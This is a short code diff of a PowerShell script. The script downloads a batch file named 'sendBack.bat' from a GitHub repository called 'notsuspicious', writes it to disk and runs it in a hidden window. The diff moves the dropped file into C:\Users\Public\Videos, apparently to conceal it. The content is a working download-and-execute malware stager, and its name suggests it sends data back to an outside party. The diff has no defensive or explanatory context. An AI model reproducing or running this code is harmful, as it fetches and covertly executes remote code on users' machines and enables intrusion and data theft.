@@ -6,6 +6,6 @@ catch {
 }
 Invoke-Expression {
     $batchContent = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.bat" -UseBasicParsing).Content
-    $batchContent | Out-File -FilePath "sendBack.bat" -Encoding ASCII
-    Start-Process -FilePath "sendBack.bat" -WindowStyle Hidden -Wait
+    $batchContent | Out-File -FilePath "C:\Users\Public\Videos\sendBack.bat" -Encoding ASCII
+    Start-Process -FilePath "C:\Users\Public\Videos\sendBack.bat" -WindowStyle Hidden -Wait
 }
